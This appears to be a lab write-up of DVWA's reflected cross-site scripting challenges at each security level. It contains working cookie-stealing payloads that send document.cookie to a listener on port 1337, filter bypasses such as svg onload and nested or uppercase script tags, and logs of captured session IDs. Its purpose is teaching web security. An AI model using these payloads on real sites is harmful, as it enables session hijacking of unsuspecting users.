---
title: DVWA - XSS (Reflected)
date: 2023-12-17
categories: [DVWA]
tags: [dvwa, xss, xss-reflected, cross-site-scripting, javascript]
img_path: /assets/dvwa/xss_reflected
published: true
---

## Information

- [How to install dvwa on Kali](https://www.kali.org/tools/dvwa/).
- [Official GitHub repository](https://github.com/digininja/DVWA).

> The DVWA server itself contains instructions about almost everything.

_**Damn Vulnerable Web Application (DVWA)** is a PHP/MySQL web application that is damn vulnerable. Its main goal is to be an aid for security professionals to test their skills and tools in a legal environment, help web developers better understand the processes of securing web applications and to aid both students & teachers to learn about web application security in a controlled class room environment._

_The aim of DVWA is to practice some of the most common web vulnerabilities, with various levels of difficultly, with a simple straightforward interface._

![](dvwa_home.png){: width='70%' }

The DVWA server has **4 different security levels** which can be set as seen below:

![](security_levels.png){: width='70%' }

- **Low**: This security level is completely vulnerable and has no security measures at all. It's use is to be as an example of how web application vulnerabilities manifest through bad coding practices and to serve as a platform to teach or learn basic exploitation techniques.
- **Medium**: This setting is mainly to give an example to the user of bad security practices, where the developer has tried but failed to secure an application. It also acts as a challenge to users to refine their exploitation techniques.
- **High**: This option is an extension to the medium difficulty, with a mixture of harder or alternative bad practices to attempt to secure the code. The vulnerability may not allow the same extent of the exploitation, similar in various Capture The Flags (CTFs) competitions.
- **Impossible**: This level should be secure against all vulnerabilities. It is used to compare the vulnerable source code to the secure source code.

## Cross-Site Scripting (XSS) (Reflected)

XSS attacks are a type of injection problem, in which malicious scripts are injected into the otherwise benign and trusted web sites. XSS attacks occur when an attacker uses a web application to send malicious code, generally in the form of a browser side script, to a different end user. Flaws that allow these attacks to succeed are quite widespread and occur anywhere a web application using input from a user in the output, without validating or encoding it.

An attacker can use XSS to send a malicious script to an unsuspecting user. The end user's browser has no way to know that the script should not be trusted, and will execute the JavaScript. Because it thinks the script came from a trusted source, the malicious script can access any cookies, session tokens, or other sensitive information retained by your browser and used with that site. These scripts can even rewrite the content of the HTML page.

Because its a **reflected XSS**, the malicious code is not stored in the remote web application, so **requires some social engineering** (such as a link via email/chat).

**Objective**: One way or another, steal the cookie of a logged in user.

## Security: Low
> _Low level will not check the requested input, before including it to be used in the output text ([Source code](https://github.com/CSpanias/cspanias.github.io/blob/main/assets/dvwa/xss_reflected/xss_reflected_low_source.php))._

1. Putting our name in the input form, we notice the the parameter `name` appears on the address bar:

    ![](home_kuv4z.png)

2. Instead of our name, we can try a simple payload to see it will work:

    ![](low_test.png)

3. We can check if a XSS vulnerability exists by passing a very simple payload:

    ```javascript
    <script>alert(document.cookie)</script>
    ```

    ![](low_test.png)

4. Our goal is to get our target's cookie value, so we will have to use a payload that grabs his cookie but also send it to us. Let's start by launch a Python3 HTTP server:

    ```shell
    $ python3 -m http.server 1337
    Serving HTTP on 0.0.0.0 port 1337 (http://0.0.0.0:1337/) ...
    ```

5. If we pass the exact same payload as the one we used for the [XSS (DOM)](https://cspanias.github.io/posts/DVWA-XSS-(DOM)/#security-low) section, it won't work:

    ```javascript
    <script>window.location='http://127.0.0.1:1337/?cookie='+document.cookie</script>
    ```

    ![](low_payload_fail.png)

6. If we view the page's source, we will notice that the `+` symbol disappears:

    ![](low_page_source.png)

7. We can try to [URL-encode](https://www.w3schools.com/tags/ref_urlencode.ASP) the `+` symbol and try again:

    ![](url_enc.png)

    ```javascript
    <script>window.location='http://127.0.0.1:1337/?cookie='%2Bdocument.cookie</script>
    ```
    ![](low_payload.png)

    ```shell
    $ sudo python3 -m http.server 1337
    Serving HTTP on 0.0.0.0 port 1337 (http://0.0.0.0:1337/) ...
    127.0.0.1 - - [17/Dec/2023 17:17:49] "GET /?cookie=PHPSESSID=fejtgct45j1cmkcedvieacnai5;%20security=low HTTP/1.1" 200 -
    ```

## Security: Medium
> _The developer has tried to add a simple pattern matching to remove any references to `<script>`, to disable any JavaScript ([Source code](https://github.com/CSpanias/cspanias.github.io/blob/main/assets/dvwa/xss_reflected/xss_reflected_medium_source.php))._

1. First, let's get rid of the PHP error we have by changing `${name}` to `{$name}` in `/usr/share/dvwa/vulnerabilities/xss_r/source/medium.php` and refreshing the page:

    ![](php_error.png)

    ![](medium_php.png)

    ![](medium_php_fixed.png)

2. If we take a look at the page's source code, we will see that the `<script>` tag gets removed, so this time the same payload won't work. There is a handy [XSS Payload List](https://github.com/1N3/IntruderPayloads/blob/master/FuzzLists/xss_payloads_quick.txt) on GitHub, so we can choose any other form of payload which does not include the blacklisted tag. Let's try one:

    ![](medium_source_code.png)

    ```javascript
    </select><svg/onload=alert(1)>
    ```

    ![](medium_test.png)

3. We can use the same process as before to steal our target's cookie:

    ```javascript
    <svg/onload=window.location='http://127.0.0.1:1337/?cookie='%2Bdocument.cookie>
    ```

    ![](medium_payload_cookie.png)

    ```shell
    $ python3 -m http.server 1337
    Serving HTTP on 0.0.0.0 port 1337 (http://0.0.0.0:1337/) ...
    127.0.0.1 - - [17/Dec/2023 17:37:35] "GET /?cookie=security=medium;%20PHPSESSID=gmij2886a88afu2o2l0fkt1943 HTTP/1.1" 200 -
    ```

4. The developer's code is case sensitive so it is only checking for an exact match of `<script>`. So, we could also use the following payload to bypass this:

    ```javascript
    <SCRIPT>window.location='http://127.0.0.1:1337/?cookie='%2Bdocument.cookie</script>
    ```

5. We could also apply the same concept as we did on the [LFI](https://cspanias.github.io/posts/DVWA-File-Inclusion/#local-file-inclusion-1) section, and pass the following payload:

    ```javascript
    <scr<script>ipt>window.location='http://127.0.0.1:1337/?cookie='%2Bdocument.cookie</script>
    ```

## Security: High
> _The developer now believes they can disable all JavaScript by removing the pattern `<s*c*r*i*p*t` ([Source code](https://github.com/CSpanias/cspanias.github.io/blob/main/assets/dvwa/xss_reflected/xss_reflected_high_source.php))._

> You can fix the error as above.

1. This level can be attacked the same way as the previous one as the developer just changed the blacklisted pattern to `<s*c*r*i*p*t`:

    ```javascript
    <svg/onload=window.location='http://127.0.0.1:1337/?cookie='%2Bdocument.cookie>
    ```

    ![](high_payload.png)

    ```shell
    $ sudo python3 -m http.server 1337
    Serving HTTP on 0.0.0.0 port 1337 (http://0.0.0.0:1337/) ...
    127.0.0.1 - - [17/Dec/2023 17:42:59] "GET /?cookie=security=high;%20PHPSESSID=gmij2886a88afu2o2l0fkt1943 HTTP/1.1" 200 -
    ```

## Security: Impossible
> _Using inbuilt PHP functions, such as [`htmlspecialchars()`](https://secure.php.net/manual/en/function.htmlspecialchars.php), its possible to escape any values which would alter the behaviour of the input ([Source code](https://github.com/CSpanias/cspanias.github.io/blob/main/assets/dvwa/xss_reflected/xss_reflected_impossible_source.php))._

## Resources

- Cryptocat's [video walkthrough](https://www.youtube.com/watch?v=qHHADT52L5s).
- OWASP's [Cross Site Scripting (XSS)](https://owasp.org/www-community/attacks/xss/).
- GitHub's [XSS Payload List](https://github.com/1N3/IntruderPayloads/blob/master/FuzzLists/xss_payloads_quick.txt).